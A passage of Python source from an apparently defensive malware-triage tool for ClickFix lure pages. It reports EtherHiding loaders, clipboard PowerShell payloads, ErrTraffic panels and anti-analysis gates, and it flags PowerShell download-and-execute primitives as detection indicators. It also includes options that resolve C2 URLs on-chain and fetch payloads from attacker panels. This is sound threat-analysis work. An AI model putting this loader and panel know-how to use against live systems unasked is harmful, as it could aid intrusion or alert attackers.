    p("\n" + "=" * 80 + "\n"); p(f" INPUT: {label}\n")
    src = report["input"]["source"]
    src_keys_to_show = ("status", "final_url", "content_type", "bytes_received", "fetched_at")
    src_bits = [f"{k}={v}" for k, v in src.items() if k in src_keys_to_show and v is not None]
    if src_bits: p(f"        ({', '.join(src_bits)})\n")
    p("=" * 80 + "\n")
    if report["errors"]:
        p("  [errors]\n")
        for e in report["errors"]: p(f"    - {e}\n")
    pg = report["page"]
    for s in pg.get("injected_script_srcs", []): p(f"  [injected <script src>] {s}\n")
    p(f"  inline <script> blocks: {pg.get('inline_script_blocks', 0)} | "
      f"obfuscated loader blocks: {pg.get('obfuscated_loader_blocks', 0)}\n")
    summ = report["summary"]
    if summ.get("actors_attributed"):
        p("\n  >>> ATTRIBUTION:\n")
        seen = set()
        for a in summ["actors_attributed"]:
            key = (a["name"], a["confidence"])
            if key in seen: continue
            seen.add(key)
            srcs = ", ".join(a["sources"])
            p(f"        {a['name']}  (confidence: {a['confidence']}; sources: {srcs})\n")
    if not quiet:
        for g in report["groups"]:
            idxs = g["block_indexes"]
            if not idxs:
                # Synthetic group (e.g. plaintext-scripts classifier pass).
                idxs_str = "[plaintext]"
            elif len(idxs) == 1:
                idxs_str = f"#{idxs[0]}"
            else:
                idxs_str = (f"#{idxs[0]} (+{len(idxs)-1} clones: " +
                            ", ".join(f"#{i}" for i in idxs[1:]) + ")")
            tag = {"payload":"[PAYLOAD]", "next_stage_loader":"[NEXT-STAGE LOADER]",
                   "decoded":"[decoded, inert]", "no_decode":"[no-decode]"}.get(
                       g["verdict"], f"[{g['verdict']}]")
            p(f"\n  --- block {idxs_str}  {tag}  hash:{g['group_hash']}  "
              f"layers: {len(g['decode_layers'])}\n")
            for layer in g["decode_layers"]:
                p(f"        {layer['scheme']}: {layer['info']}\n")
            for cls in g["classifications"]: _render_cls_text(cls, p)
            covered = set()
            for cls in g["classifications"]:
                for k in ("rpc_pool_defanged", "hosts_defanged", "commands", "contract_addresses"):
                    v = cls.get(k) or []
                    if isinstance(v, list): covered.update(v)
            for u in [u for u in g["iocs"]["urls"] if u not in covered][:8]:
                p(f"      * url:  {u}\n")
            for ip in g["iocs"]["ips"][:6]: p(f"      * ip:   {ip}\n")
            for cid in g["iocs"]["labeled_ids"]:
                if not any(cid in (cls.get("labeled_ids") or []) for cls in g["classifications"]):
                    p(f"      * labeled id: {cid}\n")
            if g.get("recovered_js_path"):
                p(f"      -> recovered JS: {g['recovered_js_path']}  "
                  f"({g.get('recovered_js_size', 0):,} bytes)\n")
    p("\n  " + "-" * 78 + "\n")
    p(f"  SUMMARY: {summ['obfuscated_blocks']} obfuscated blocks -> "
      f"{summ['distinct_groups']} distinct payload group(s); "
      f"classifications: {', '.join(summ['schemes_seen']) or 'none'}\n")
    _render_verdict_block(summ, p)
    p("\n")


def _render_cls_text(cls: dict, p):
    s = cls["scheme"]
    if s == "etherhiding":
        p(f"      * EtherHiding loader  (chain: {cls['chain']})\n")
        for a in cls["contract_addresses"]:
            tag = ""
            if cls.get("actor_attribution") and \
               cls["actor_attribution"].get("contract_matched", "").lower() == a.lower():
                tag = f"   <- {cls['actor_attribution']['name']}"
            p(f"      *   contract: {a}{tag}\n")
        if cls["method_selector"]:
            sel = cls["method_selector"]
            tag = ""
            meta = cls.get("selector_info") or {}
            if meta.get("signature"): tag = f"   ({meta['signature']})"
            p(f"      *   method selector: {sel}{tag}\n")
        p(f"      *   RPC pool ({len(cls['rpc_pool_defanged'])}):\n")
        for u in cls["rpc_pool_defanged"]: p(f"      *     - {u}\n")
        p(f"      *   WALL: {cls['wall_reason']}\n")
        if cls.get("actor_attribution"):
            a = cls["actor_attribution"]
            # Only print what we directly OBSERVED from this loader. The
            # advertised_as/infra/registrar/downstream/victims fields are CTI
            # background about the kit in general — NOT observations of THIS
            # target — and now live in a single dedicated section higher up
            # in the comprehensive report (see _render_kit_cti_background).
            # Per-block we only state the match + confidence + sources.
            p(f"      *   actor: {a['name']}  (kit-match confidence: {a['confidence']})\n")
            p(f"      *     sources: {', '.join(a['sources'])}\n")
        if cls.get("resolved"):
            r = cls["resolved"]
            if r["ok"]:
                p(f"      *   RESOLVED next-stage URL: {r.get('decoded_url_defanged')}\n")
                p(f"      *     via RPC: {_defang(r['rpc_used'])}  ({r['decoded_at']})\n")
            else: p(f"      *   RESOLVE FAILED: {r.get('error')}\n")
    elif s == "clipboard_payload":
        p(f"      * Clipboard sink: {cls['sink']}\n")
        if cls.get("clipboard_arg_excerpt"):
            p(f"      *   arg ({cls.get('clipboard_arg_length')} chars): "
              f"{cls['clipboard_arg_excerpt']}\n")
    elif s == "aes_kit":
        p(f"      * AES kit markers present  ({cls['note']})\n")
        for b in cls["fromBase64_blobs"]:
            p(f"      *   FromBase64String[{b['len']} chars]: {b['head']}...\n")
        for cid in cls["labeled_ids"]: p(f"      *   labeled id: {cid}\n")
    elif s == "bw_v2_launcher":
        p(f"      * BW v2 plaintext launcher  ({cls.get('kit','ErrTraffic v3 (BW v2)')})\n")
        p(f"      *   download URL: {cls.get('dl_url_defanged')}\n")
        if cls.get("token"):
            p(f"      *   token ({cls.get('token_alias','uj')}=): {cls['token']}\n")
        if cls.get("rlm"):
            p(f"      *   rlm: {cls['rlm']}\n")
        if cls.get("confidence") is not None:
            p(f"      *   confidence: {cls['confidence']:.2f}\n")
        chain_bits = []
        if cls.get("has_invoke_webrequest"): chain_bits.append("iwr")
        if cls.get("has_start_process"):     chain_bits.append("Start-Process")
        if cls.get("has_invoke_expression"): chain_bits.append("iex")
        if cls.get("has_file_arg"):          chain_bits.append("-File")
        if chain_bits:
            p(f"      *   chain primitives: {', '.join(chain_bits)}\n")
    elif s == "powershell_command":
        for c in cls["commands"]: p(f"      * command: {c[:240]}\n")
    elif s == "tds_beacon":
        p(f"      * TDS / fingerprint beacon hosts:\n")
        for h in cls["hosts_defanged"]: p(f"      *   - {h}\n")
    elif s == "antianalysis_gate":
        if cls.get("debugger_timing_gate"): p(f"      * anti-analysis: debugger+timing gate\n")
        if cls.get("os_device_gate"):
            excl = cls.get("os_device_excl") or []
            p(f"      * anti-analysis: OS/device gate"
              + (f" (excludes: {', '.join(excl)})" if excl else "") + "\n")
        if cls.get("cookie_dedup_names"):
            p(f"      * anti-analysis: per-victim cookies "
              f"({', '.join(cls['cookie_dedup_names'])})\n")


def _render_verdict_block(summ: dict, p):
    v = summ["verdict"]
    if v == "clipboard_or_powershell_payload":
        p("  VERDICT: CLIPBOARD / POWERSHELL PAYLOAD RECOVERED\n"); return
    if v == "etherhiding_loader":
        if summ.get("resolved_next_stage_urls"):
            p("  VERDICT: EtherHiding loader recovered AND RESOLVED.\n")
            p("           Live next-stage URL(s) read from chain:\n")
            for u in summ["resolved_next_stage_urls"]: p(f"             {u}\n")
        else:
            attrs = summ.get("actors_attributed") or []
            if attrs: p(f"  VERDICT: EtherHiding loader recovered ({attrs[0]['name']}).\n")
            else:     p("  VERDICT: EtherHiding loader recovered (unknown actor).\n")
            p("           Next-stage URL is on-chain; re-run with --resolve to "
              "fetch it live\n           via a passive read-only eth_call.\n")
        return
    if v == "tds_beacon_only":
        p("  VERDICT: TDS/fingerprint beacon recovered, no payload — server-side gated.\n"); return
    if v == "scaffolding_only":
        p("  VERDICT: loader scaffolding recovered, no payload "
          "(check recovered .js files; class may be unknown).\n"); return
    if v == "no_input": p("  VERDICT: no input (empty html).\n"); return
    p("  VERDICT: nothing recovered.\n")


def render_json(report: dict, fh=sys.stdout, *, jsonl: bool = False):
    if jsonl:
        json.dump(report, fh, ensure_ascii=False, sort_keys=False); fh.write("\n")
    else:
        json.dump(report, fh, ensure_ascii=False, sort_keys=False, indent=2); fh.write("\n")


# ============================================================================
# CSV output (flat row per (input, group))
# ============================================================================
CSV_COLUMNS = [
    "input", "source_type", "fetch_status", "fetch_bytes",
    "page_inline_blocks", "page_obf_blocks",
    "group_hash", "group_blocks", "clone_count", "verdict", "schemes",
    "chain", "contract_addresses", "method_selector", "method_signature",
    "rpc_pool", "resolved_url", "actor_name", "actor_confidence", "actor_sources",
    "recovered_js_bytes", "top_urls", "ips", "labeled_ids",
    "cookies", "anti_analysis_flags", "recovered_js_path", "error",
    # --payload-in-batch metadata (blank unless --payload + --resolve found a panel)
    "payload_panel_url", "payload_oses_recovered", "payload_distinct_hashes",
    "payload_all_same", "payload_sha256_list", "payload_file_magics",
    "payload_filenames", "payload_servers",
]

# Comprehensive-mode CSV — flatter, one row per IOC, with all the v4 enrichments.
COMPREHENSIVE_CSV_COLUMNS = [
    "lure_url", "lure_ip", "lure_open_ports", "lure_cert_sha256",
    "lure_is_wordpress", "lure_wp_confidence", "lure_wp_version", "lure_wp_signals",
    "lure_behind_cf", "lure_cf_signals_count", "lure_cf_ray", "lure_server_header",
    "loader_count", "loader_schemes",
    "external_scripts_total", "external_scripts_suspicious_count",
    "external_scripts_non_wp_count", "external_scripts_wp_core_count",
    "external_scripts_analytics_count", "external_scripts_suspicious_urls",
    "actor_name", "actor_confidence", "actor_sources",
    "chain", "contract_address", "method_selector", "method_signature",
    "rpc_pool_size",
    "resolved_c2_url", "panel_host", "panel_ip", "panel_open_ports",
    "panel_cert_sha256", "panel_behind_cf", "panel_cf_signals_count",
    "aes_recovered", "aes_plaintext_sha256", "aes_staged_url",
    "aes_token", "aes_mode", "aes_src", "aes_os",
    "payload_oses_recovered", "payload_oses_failed", "payload_distinct_hashes",
    "payload_all_same", "payload_file_magics", "payload_endpoint_families",
    "init_aes_ps_sha256", "init_aes_ps_recovered",
    "init_aes_decrypted_sha256", "init_aes_decrypted_dl_url",
    # BW v2 envelope-decrypt (panel-mode auto-decrypt of /api/cfg + /api/settings)
    "bw_v2_envelopes_decrypted", "bw_v2_envelope_key_source",
    "bw_v2_mode", "bw_v2_enabled", "bw_v2_block_bots", "bw_v2_rental_expired",
    "bw_v2_panel_base_url",
    "errors",
]

# Sidecar CSV — one row per (input, external script src). Written alongside the
# main comprehensive CSV as `<csv>.scripts.csv` so analysts can sort/filter
# every JS dependency the lure page loads without leaving Excel.
SCRIPTS_CSV_COLUMNS = ["lure_url", "category", "script_src", "note"]


def comprehensive_to_csv_row(report: dict) -> dict:
    """Flatten a comprehensive report into a single CSV row."""
    s   = report.get("summary") or {}
    fp  = report.get("server_fingerprint") or {}
    pfp = report.get("panel_server_fingerprint") or {}
    wp  = report.get("wordpress") or {}
    cf  = report.get("cloudflare") or {}
    pcf = report.get("panel_cloudflare") or {}
    base = report.get("lure_page") or {}
    groups = base.get("groups") or []
    pp  = report.get("panel_payloads") or {}
    pp_meta = pp.get("meta") or {}
    aes_recs = report.get("aes_clipboard_recovery") or []
    aes_ok = next((r for r in aes_recs if r.get("ok")), {})
    ehp = aes_ok.get("errtraffic_payload_url") or {}

    # pick the first EtherHiding classification (if any)
    eh = None
    for g in groups:
        for c in g.get("classifications", []):
            if c["scheme"] == "etherhiding": eh = c; break
        if eh: break

    # External-script rollup
    inj_srcs = (base.get("page") or {}).get("injected_script_srcs") or []
    cats = _categorize_scripts(inj_srcs) if inj_srcs else {"suspicious": [], "non_wp_core": [],
                                                            "wp_core": [], "analytics": []}
    susp_urls = " | ".join(src for src, _ in cats["suspicious"])

    # Endpoint families that produced a payload (windows/v3_runtime, mac/v2_admin, etc.)
    fam_pairs = []
    init_aes_ps_sha = init_aes_ps_n = init_pt_sha = init_dl_url = ""
    for o, r in (pp.get("per_os") or {}).items():
        if r.get("sha256") and r.get("endpoint_family"):
            fam_pairs.append(f"{o}={r['endpoint_family']}")
        # Capture init→AES details from the first OS that produced them
        if not init_aes_ps_sha and r.get("init_response_aes_ps_sha256"):
            init_aes_ps_sha = r.get("init_response_aes_ps_sha256")
            init_aes_ps_n   = bool(r.get("init_response_aes_ps"))
            ird = r.get("init_response_aes_decrypt") or {}
            init_pt_sha     = ird.get("plaintext_sha256") or ""
            init_dl_url     = ird.get("dl_url") or ""

    return {
        "lure_url":              s.get("lure_url", ""),
        "lure_ip":               (fp.get("ip") or ""),
        "lure_open_ports":       ",".join(map(str, fp.get("open_ports") or [])),
        "lure_cert_sha256":      ((fp.get("tls_cert") or {}).get("fingerprint_sha256") or ""),
        "lure_is_wordpress":     wp.get("is_wp", False),
        "lure_wp_confidence":    wp.get("confidence", ""),
        "lure_wp_version":       wp.get("version", "") or "",
        "lure_wp_signals":       ",".join(wp.get("signals") or []),
        "lure_behind_cf":        cf.get("behind_cf", False),
        "lure_cf_signals_count": len(cf.get("signals") or []),
        "lure_cf_ray":           cf.get("cf_ray", "") or "",
        "lure_server_header":    cf.get("server", "") or "",
        "loader_count":          base.get("page", {}).get("obfuscated_loader_blocks", 0),
        "loader_schemes":        ",".join(s.get("classifications") or []),
        "external_scripts_total":             len(inj_srcs),
        "external_scripts_suspicious_count":  len(cats["suspicious"]),
        "external_scripts_non_wp_count":      len(cats["non_wp_core"]),
        "external_scripts_wp_core_count":     len(cats["wp_core"]),
        "external_scripts_analytics_count":   len(cats["analytics"]),
        "external_scripts_suspicious_urls":   susp_urls,
        "actor_name":            (s.get("actors_attributed") or [{}])[0].get("name", ""),
        "actor_confidence":      (s.get("actors_attributed") or [{}])[0].get("confidence", ""),
        "actor_sources":         ",".join((s.get("actors_attributed") or [{}])[0].get("sources") or []),
        "chain":                 (eh or {}).get("chain", ""),
        "contract_address":      ",".join((eh or {}).get("contract_addresses") or []),
        "method_selector":       (eh or {}).get("method_selector", "") or "",
        "method_signature":      ((eh or {}).get("selector_info") or {}).get("signature", ""),
        "rpc_pool_size":         len((eh or {}).get("rpc_pool") or []),
        "resolved_c2_url":       (s.get("resolved_c2") or [""])[0],
        "panel_host":            pfp.get("host", "") or "",
        "panel_ip":              pfp.get("ip", "") or "",
        "panel_open_ports":      ",".join(map(str, pfp.get("open_ports") or [])),
        "panel_cert_sha256":     ((pfp.get("tls_cert") or {}).get("fingerprint_sha256") or ""),
        "panel_behind_cf":       pcf.get("behind_cf", "") if pcf else "",
        "panel_cf_signals_count": len((pcf or {}).get("signals") or []),
        "aes_recovered":         bool(aes_ok),
        "aes_plaintext_sha256":  aes_ok.get("sha256", "") or "",
        "aes_staged_url":        (aes_ok.get("urls_in_plaintext") or [""])[0],
        "aes_token":             ehp.get("token", "") or "",
        "aes_mode":              ehp.get("mode", "") or "",
        "aes_src":               ehp.get("src", "") or "",
        "aes_os":                ehp.get("os", "") or "",
        "payload_oses_recovered": ",".join(pp_meta.get("successful_os") or []),
        "payload_oses_failed":   ",".join(pp_meta.get("failed_os") or []),
        "payload_distinct_hashes": pp_meta.get("distinct_hashes", ""),
        "payload_all_same":      pp_meta.get("all_same_payload", ""),
        "payload_file_magics":   ",".join(pp_meta.get("file_magics") or []),
        "payload_endpoint_families": ",".join(fam_pairs),
        "init_aes_ps_sha256":       init_aes_ps_sha,
        "init_aes_ps_recovered":    init_aes_ps_n,
        "init_aes_decrypted_sha256": init_pt_sha,
        "init_aes_decrypted_dl_url": init_dl_url,
        # BW v2 envelope-decrypt
        "bw_v2_envelopes_decrypted": _bw_v2_envelopes_decrypted_count(report),
        "bw_v2_envelope_key_source": _bw_v2_envelope_key_source(report),
        "bw_v2_mode":                (report.get("envelope_recovery") or {}).get("summary", {}).get("mode", ""),
        "bw_v2_enabled":             (report.get("envelope_recovery") or {}).get("summary", {}).get("enabled", ""),
        "bw_v2_block_bots":          (report.get("envelope_recovery") or {}).get("summary", {}).get("blockBots", ""),
        "bw_v2_rental_expired":      (report.get("envelope_recovery") or {}).get("summary", {}).get("rentalExpired", ""),
        "bw_v2_panel_base_url":      (report.get("envelope_recovery") or {}).get("summary", {}).get("panelBaseUrl", ""),
        "errors":                "; ".join(report.get("errors") or []),
    }


def _bw_v2_envelopes_decrypted_count(report: dict) -> int:
    env = (report.get("envelope_recovery") or {}).get("responses") or []
    return sum(1 for r in env if r.get("decrypted") is not None)


def _bw_v2_envelope_key_source(report: dict) -> str:
    env = (report.get("envelope_recovery") or {}).get("responses") or []
    return (env[0].get("key_source") if env else "") or ""


def comprehensive_to_scripts_csv_rows(report: dict) -> Iterable[dict]:
    """One row per (lure_url, external <script src>) — for the .scripts.csv sidecar.
    Restores per-script visibility that the count-collapsed renderer dropped."""
    lure = (report.get("summary") or {}).get("lure_url", "")
    inj  = ((report.get("lure_page") or {}).get("page") or {}).get("injected_script_srcs") or []
    if not inj: return []
    cats = _categorize_scripts(inj)
    rows = []
    for category, items in (("suspicious", cats["suspicious"]),
                            ("non_wp_core", cats["non_wp_core"]),
                            ("wp_core",     cats["wp_core"]),
                            ("analytics",   cats["analytics"])):
        for src, note in items:
            rows.append({"lure_url": lure, "category": category,
                         "script_src": src, "note": note or ""})
    return rows


def report_to_csv_rows(report: dict) -> Iterable[dict]:
    src = report["input"]["source"]
    base = {
        "input":             report["input"]["label"],
        "source_type":       src.get("source_type", ""),
        "fetch_status":      src.get("status", ""),
        "fetch_bytes":       src.get("bytes_received", ""),
        "page_inline_blocks": report["page"].get("inline_script_blocks", 0),
        "page_obf_blocks":    report["page"].get("obfuscated_loader_blocks", 0),
        "error":             "; ".join(report.get("errors", [])),
    }
    # Fold any batch --payload metadata onto every row for this report.
    summ = report.get("summary", {}) or {}
    per_os = ((report.get("panel_payloads") or {}).get("per_os") or {})
    base["payload_panel_url"]       = summ.get("payload_panel_url", "")
    base["payload_oses_recovered"]  = ",".join(summ.get("payload_oses_recovered", []) or [])
    base["payload_distinct_hashes"] = summ.get("payload_distinct_hashes", "")
    base["payload_all_same"]        = summ.get("payload_all_same", "")
    base["payload_sha256_list"]     = ",".join(summ.get("payload_sha256_list", []) or [])
    base["payload_file_magics"]     = ",".join(summ.get("payload_file_magics", []) or [])
    base["payload_filenames"]       = ",".join(sorted({r.get("payload_filename") for r in per_os.values() if r.get("payload_filename")}))
    base["payload_servers"]         = ",".join(sorted({r.get("payload_server") for r in per_os.values() if r.get("payload_server")}))
    if not report["groups"]:
        yield {**{c: "" for c in CSV_COLUMNS}, **base,
               "verdict": report["summary"].get("verdict", "")}
        return
    for g in report["groups"]:
        eh = next((c for c in g["classifications"] if c["scheme"] == "etherhiding"), {})
        cb = next((c for c in g["classifications"] if c["scheme"] == "clipboard_payload"), {})
        ag = next((c for c in g["classifications"] if c["scheme"] == "antianalysis_gate"), {})
        att = eh.get("actor_attribution") or {}
        resolved = (eh.get("resolved") or {}).get("decoded_url_defanged") if eh else ""
        anti_flags = []
        if ag.get("debugger_timing_gate"): anti_flags.append("debugger_timing")
        if ag.get("os_device_gate"):       anti_flags.append("os_device")
        if ag.get("cookie_dedup_names"):   anti_flags.append("cookie_dedup")
        row = {
            **{c: "" for c in CSV_COLUMNS}, **base,
            "group_hash":         g["group_hash"],
            "group_blocks":       ",".join(str(i) for i in g["block_indexes"]),
            "clone_count":        len(g["block_indexes"]) - 1,
            "verdict":            g["verdict"],
            "schemes":            ",".join(c["scheme"] for c in g["classifications"]),
            "chain":              eh.get("chain", "") if eh else "",
            "contract_addresses": ",".join(eh.get("contract_addresses", []) if eh else []),
            "method_selector":    eh.get("method_selector", "") if eh else "",
            "method_signature":   (eh.get("selector_info") or {}).get("signature", "") if eh else "",
            "rpc_pool":           ",".join(eh.get("rpc_pool_defanged", []) if eh else []),
            "resolved_url":       resolved or "",
            "actor_name":         att.get("name", ""),
            "actor_confidence":   att.get("confidence", ""),
            "actor_sources":      ",".join(att.get("sources", [])),
            "recovered_js_bytes": g.get("recovered_js_size", ""),
            "top_urls":           ",".join((g.get("iocs", {}).get("urls") or [])[:5]),
            "ips":                ",".join((g.get("iocs", {}).get("ips") or [])[:5]),
            "labeled_ids":        ",".join((g.get("iocs", {}).get("labeled_ids") or [])),
            "cookies":            ",".join(ag.get("cookie_dedup_names", []) if ag else []),
            "anti_analysis_flags": ",".join(anti_flags),
            "recovered_js_path":  g.get("recovered_js_path", "") or "",
        }
        yield row


# ============================================================================
# Batch driver (concurrent)
# ============================================================================
def _process_target(target: str, args, outdir: str | None) -> dict:
    """Single target -> report dict. Used inside the thread pool."""
    try:
        html, meta = fetch_url_passively(target, timeout=args.fetch_timeout,
                                         verify_tls=not args.no_tls_verify)
        meta["source_type"] = "url"
        report = analyze_html(target, html, meta, max_depth=args.max_depth, outdir=outdir,
                              resolve_chain=args.resolve, rpc_override=args.rpc_url,
                              rpc_timeout=args.rpc_timeout)
        # Light-batch --payload: fetch per-OS payloads from the resolved panel
        # (metadata-only by default, cached per-panel). Requires --resolve to
        # have surfaced an on-chain C2 URL.
        if getattr(args, "payload", False):
            _maybe_fetch_payloads_for_batch(report, args)
        return report
    except (urllib.error.HTTPError, urllib.error.URLError, ConnectionError,
            TimeoutError, ssl.SSLError, OSError) as e:
        desc = _describe_fetch_exception(e, target, fetch_timeout=args.fetch_timeout,
                                         verify_tls=not args.no_tls_verify)
        return _error_report(target, desc["err"], status=desc["status"],
                             category=desc["category"], hint=desc["hint"],
                             panel_probe=desc.get("panel_probe"))
    except Exception as e:
        return _error_report(target, f"unexpected: {e.__class__.__name__}: {e}",
                             category="other")


def socket_timeout_excs():
    import socket
    return (socket.timeout, socket.gaierror)


def _error_report(target: str, err: str, *, status: int | None = None,
                  category: str | None = None, hint: str | None = None,
                  panel_probe: dict | None = None) -> dict:
    """Build a structured fetch-error report.

    Adds optional fields used by the friendly renderer:
      status        — HTTP status when we got one (e.g. 404, 403, 503)
      category      — short bucket: 'http', 'dns', 'tls', 'timeout', 'connect', 'other'
      hint          — actionable one-liner shown to the user
      panel_probe   — when we ran classify_input_role to see if the host is an
                      ErrTraffic panel, the role dict (so we can suggest
                      --comprehensive when the 404 root hides a live /api/init)
    """
    src = {"source_type": "url", "status": status, "bytes_received": 0}
    summary = {"obfuscated_blocks": 0, "distinct_groups": 0, "schemes_seen": [],
               "verdict": "fetch_error",
               "actors_attributed": [], "resolved_next_stage_urls": [],
               "fetch_error": {"message": err, "category": category,
                                "status": status, "hint": hint}}
    if panel_probe:
        summary["fetch_error"]["panel_probe"] = {
            "role":       panel_probe.get("role"),
            "confidence": panel_probe.get("confidence"),
            "signals":    panel_probe.get("signals", []),
        }
    return {
        "schema_version": SCHEMA_VERSION, "tool": TOOL_VERSION,
        "input":   {"label": target, "source": src},
        "page":    {}, "groups": [], "errors": [err],
        "summary": summary,
    }


def _describe_fetch_exception(exc: BaseException, target: str,
                              *, fetch_timeout: int = 10,
                              verify_tls: bool = True) -> dict:
    """Classify any fetch failure into a structured kwargs dict for _error_report.

    For HTTP-status failures on the root (404/403/410) we ALSO run a passive
    panel probe (classify_input_role) — many ErrTraffic panels return 404 on /
    but a live token JSON on /api/index.php?a=init. If we detect that, the
    hint suggests `--comprehensive` so the user gets useful output instead of
    a crash.
    """
    err_msg, status, category, hint, panel_probe = "", None, "other", None, None
    if isinstance(exc, urllib.error.HTTPError):
        status   = exc.code
        err_msg  = f"HTTP {exc.code} {exc.reason}"
        category = "http"
        # Probe for a hidden panel behind a 404/403/410 root — common with
        # ErrTraffic/Aeternum, which gate everything behind /api/index.php
        if status in (400, 401, 403, 404, 410, 451, 500, 502, 503):
            try:
                panel_probe = classify_input_role(target, timeout=min(fetch_timeout, 8),
                                                  verify_tls=verify_tls)
            except Exception:
                panel_probe = None
            if panel_probe and panel_probe.get("role") == "panel":
                hint = ("Host returned " + str(status) + " on `/` but the panel-probe "
                        "shape (`/api/index.php?a=init` returns a token JSON) — this "
                        "looks like an ErrTraffic/Aeternum panel. Re-run with "
                        "`--comprehensive [--payload]` to drive the panel-direct flow.")
            else:
                hint = ("Target reachable but root returned " + str(status) +
                        ". The lure may be at a non-root path, or the host may have "
                        "been taken down. Try `--comprehensive` (auto-probes /api/init) "
                        "or pass the explicit lure URL with path.")
    elif isinstance(exc, urllib.error.URLError):
        reason = getattr(exc, "reason", exc)
        err_msg = f"URLError: {reason}"
        # Subclassify the reason
        if isinstance(reason, ssl.SSLError) or "ssl" in str(reason).lower() or "certificate" in str(reason).lower():
            category = "tls"
            hint = "TLS/certificate failure. Try `--no-tls-verify` (corp MITM / stale clock / self-signed)."
        elif isinstance(reason, TimeoutError) or "timed out" in str(reason).lower():
            category = "timeout"
            hint = f"Connection timed out after {fetch_timeout}s. Try `--fetch-timeout 60` or the host may be down."
        elif "name or service not known" in str(reason).lower() or "getaddrinfo" in str(reason).lower():
            category = "dns"
            hint = "DNS resolution failed. Confirm the domain still exists; many ClickFix lures are short-lived."
        elif "refused" in str(reason).lower():
            category = "connect"
            hint = "Connection refused — host is online but not serving on this port. Try the other scheme (http vs https)."
        else:
            category = "connect"
            hint = "Network-level failure reaching the host. Confirm the machine has Internet access."
    elif isinstance(exc, TimeoutError) or exc.__class__.__name__ == "timeout":
        err_msg = f"timeout after {fetch_timeout}s"
        category = "timeout"
        hint = f"Connection timed out. Try `--fetch-timeout 60` or the host may be down."
    elif isinstance(exc, ssl.SSLError):
        err_msg = f"SSLError: {exc}"
        category = "tls"
        hint = "TLS handshake failed. Try `--no-tls-verify`."
    elif isinstance(exc, ConnectionError):
        err_msg = f"ConnectionError: {exc}"
        category = "connect"
        hint = "Connection error. Host may be offline, blocking the UA, or geo-gating."
    else:
        err_msg = f"{exc.__class__.__name__}: {exc}"
        category = "other"
    return {"err": err_msg, "status": status, "category": category,
            "hint": hint, "panel_probe": panel_probe}


def _fmt_dur(seconds: float) -> str:
    """Human mm:ss (or h:mm:ss) from a float second count."""
    seconds = int(max(0, seconds))
    h, rem = divmod(seconds, 3600)
    m, s = divmod(rem, 60)
    return f"{h:d}:{m:02d}:{s:02d}" if h else f"{m:d}:{s:02d}"


def run_batch(targets: list[str], args, outdir: str | None, sinks: dict) -> dict:
    """Returns aggregate stats. Sinks: { 'json': fh|None, 'jsonl': fh|None,
    'csv': csv.DictWriter|None, 'text_quiet': True|False }."""
    stats = {"total": len(targets), "ok": 0, "fetch_error": 0,
             "by_verdict": {}, "by_actor": {}, "started_at":
             datetime.datetime.now(datetime.timezone.utc).isoformat(timespec="seconds")
                  .replace("+00:00", "Z")}
    json_buf = []
    lock = threading.Lock()
    stats["hits"] = 0
    t0 = time.monotonic()
    last_status = 0.0
    STATUS_EVERY_SEC = 5.0          # recurring banner cadence
    total = len(targets)
    print(f"[*] batch: {total} targets, {args.workers} workers, "
          f"timeout={args.fetch_timeout}s; resolve={args.resolve}; "
          f"tls_verify={not args.no_tls_verify}; payload={args.payload}",
          file=sys.stderr, flush=True)

    with ThreadPoolExecutor(max_workers=args.workers) as ex:
        futs = {ex.submit(_process_target, t, args, outdir): t for t in targets}
        for i, fut in enumerate(as_completed(futs), 1):
            target = futs[fut]
            try: report = fut.result()
            except Exception as e: report = _error_report(target, f"worker crash: {e}")
            verd = report["summary"].get("verdict", "?")
            stats["by_verdict"][verd] = stats["by_verdict"].get(verd, 0) + 1
            if verd == "fetch_error": stats["fetch_error"] += 1
            else: stats["ok"] += 1
            for a in report["summary"].get("actors_attributed", []):
                stats["by_actor"][a["name"]] = stats["by_actor"].get(a["name"], 0) + 1
            with lock:
                if sinks.get("jsonl") is not None:
                    render_json(report, sinks["jsonl"], jsonl=True)
                    sinks["jsonl"].flush()
                if sinks.get("json") is not None: json_buf.append(report)
                if sinks.get("csv") is not None:
                    for row in report_to_csv_rows(report):
                        sinks["csv"].writerow(row)
                if not sinks.get("text_quiet", False):
                    render_text(report, quiet=args.quiet)
            # per-hit one-liner — the interesting finds, always surfaced
            is_hit = verd in ("etherhiding_loader", "clipboard_or_powershell_payload")
            if is_hit:
                stats["hits"] += 1
                actor = (report["summary"].get("actors_attributed") or [{}])[0].get("name", "")
                resolved = (report["summary"].get("resolved_next_stage_urls") or [None])[0]
                msg = f"  [hit] {target} -> {verd}"
                if actor:    msg += f"  actor={actor}"
                if resolved: msg += f"  resolved={resolved}"
                print(msg, file=sys.stderr, flush=True)
            # recurring STATUS banner — throttled to STATUS_EVERY_SEC, plus a final tick
            now = time.monotonic()
            if (now - last_status) >= STATUS_EVERY_SEC or i == total:
                last_status = now
                elapsed = now - t0
                rate = i / elapsed if elapsed > 0 else 0.0
                eta = (total - i) / rate if rate > 0 else 0.0
                print(f"  [progress {i}/{total} {100.0*i/total:4.1f}%]  "
                      f"ok={stats['ok']} err={stats['fetch_error']} hits={stats['hits']}  "
                      f"elapsed {_fmt_dur(elapsed)}  rate {rate:.1f}/s  "
                      f"left {total-i}  ETA {_fmt_dur(eta)}",
                      file=sys.stderr, flush=True)

    elapsed = time.monotonic() - t0
    stats["elapsed_sec"] = round(elapsed, 1)
    stats["completed_at"] = datetime.datetime.now(datetime.timezone.utc) \
        .isoformat(timespec="seconds").replace("+00:00", "Z")
    if sinks.get("json") is not None:
        json.dump(json_buf, sinks["json"], ensure_ascii=False, indent=2)
        sinks["json"].write("\n")
    print(f"[*] batch finished in {_fmt_dur(elapsed)}  "
          f"({stats['ok']} ok, {stats['fetch_error']} errors, {stats['hits']} hits; "
          f"avg {elapsed/max(1,total):.2f}s/target)", file=sys.stderr, flush=True)
    return stats


def _panel_url_from_report(report: dict) -> str | None:
    """Pull the on-chain-resolved C2/panel URL out of an analyze_html report
    (un-defanged) so batch --payload can target it."""
    for g in report.get("groups", []):
        for c in g.get("classifications", []):
            u = (c.get("resolved") or {}).get("decoded_url")
            if u:
                return u if u.startswith(("http://", "https://")) else "https://" + u
    return None


def _maybe_fetch_payloads_for_batch(report: dict, args) -> None:
    """Light-batch --payload: if a C2/panel URL was resolved on-chain, fetch one
    payload per OS (cached per-panel, so 1000s of lures → 1 panel = 1 touch).
    Metadata-only by default; --payload-files (or --dump) persists bytes."""
    panel_url = _panel_url_from_report(report)
    if not panel_url:
        return
    persist = bool(getattr(args, "payload_files", False) or getattr(args, "dump", None))
    out_dir = (os.path.join(args.out or ".", "payloads") if (persist and args.out) else None)
    try:
